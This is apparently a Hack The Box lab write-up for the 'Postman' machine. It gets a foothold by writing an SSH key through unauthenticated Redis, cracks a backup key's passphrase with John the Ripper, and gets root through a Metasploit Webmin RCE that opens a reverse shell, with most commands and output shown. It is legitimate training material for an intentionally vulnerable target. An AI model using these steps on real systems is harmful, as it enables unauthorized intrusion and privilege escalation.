---
path: "/htb-postman"
title: "Hack The Box - Postman"
date: "03/23/2020"
featuredImage: ../../images/postman.png
tags: ["pentesting","hackthebox","linux"]
---

You start off by doing a nmap scan to see what ports are opened. This will give you an idea of what you could potentially exploit.

## NMAP Scan

```
...
PORT      STATE SERVICE    VERSION
22/tcp    open  tcpwrapped
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|_  256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis      Redis key-value store 4.0.9
10000/tcp open  http       MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
...
```

With these result the first thing that stands out is the http server at port `80`.
This yielded nothing very useful. We can pay attention to the other http server at port `10000`.
Webmin was also a deadend (..for now)

The next available port is redis. You can use the redis-cli to connect to it. No authentication required.
`redis-cli -h 10.10.10.160`

Poking around the interwebs you can find ways to exploit a redis server.[HackTricks](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#get-sshcrackit)
The approach we are going with is to put a public key in the redis server and overwrite the `.ssh/authorized_keys`. This will allow us to ssh as the redis user.

(side note - I create a script that generates ssh keypair and then upload the public key to the server [SSH Redis Exploit](https://github.com/bascoe10/RedisExploit))

```
root@kali:~/HTB/Postman/RedisExploit# python ssh_exploit.py 10.10.10.160 /var/lib/redis/.ssh
Namespace(host='10.10.10.160', ssh_dir='/var/lib/redis/.ssh')
Key pairs generated
Redis flushed
public key added to redis
Home directory set
DB filename changed
Setting saved
Done
root@kali:~/HTB/Postman/RedisExploit# ssh redis@10.10.10.160 -i private.pem
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

redis@Postman:~$
```

Once you establish initial foothold. You can start looking for ways to escalate our privileges.
From the `/home` directory you can find that there is a user `Matt` and also in the `/opt` there is `id_rsa.bak`.

There is a passphrase required for the private key. For this, `JohnTheRipper` to the rescue.
In other to use `JohnTheRipper` the key has to be converted to `john` format with `ssh2john`.

The passphrase turns out to be `computer2008`. The ssh gets terminated immediately if you try to use this private key as Matt.
With the passphrase at hand you can to use it directly on the box.
Log in as `redis` user and the `su Matt`, supply the passhphrase and you should be good.

First flag down.

For the root flag you can exploit webmin 1.910 via `metasploit`

```
root@kali:~/HTB/Postman# msfconsole


Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
EFLAGS: 00010046
eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
ds: 0018   es: 0018  ss: 0018
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)


Stack: 90909090990909090990909090
       90909090990909090990909090
       90909090.90909090.90909090
       90909090.90909090.90909090
       90909090.90909090.09090900
       90909090.90909090.09090900
       ..........................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ccccccccc.................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       .................ccccccccc
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ..........................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffff..................
       ffffffff..................


Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing


       =[ metasploit v5.0.76-dev                          ]
+ -- --=[ 1971 exploits - 1088 auxiliary - 339 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


msf5 > use exploit/linux/http/webmin_packageup_rce
msf5 exploit(linux/http/webmin_packageup_rce) > set rhosts 10.10.10.160
rhosts => 10.10.10.160
msf5 exploit(linux/http/webmin_packageup_rce) > set lhost tun0
lhost => tun0
msf5 exploit(linux/http/webmin_packageup_rce) > set ssl true
ssl => true
msf5 exploit(linux/http/webmin_packageup_rce) > set username Matt
username => Matt
msf5 exploit(linux/http/webmin_packageup_rce) > set password computer2008
password => computer2008
msf5 exploit(linux/http/webmin_packageup_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.216:4444
[+] Session cookie: d464b6cc2a8b929cda109ff0eaaa4ec9
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.216:4444 -> 10.10.10.160:55052) at 2020-03-22 15:52:55 -0400
whoami

root
ls -al /root
...
-rw-r--r--  1 root root    33 Aug 26  2019 root.txt
```
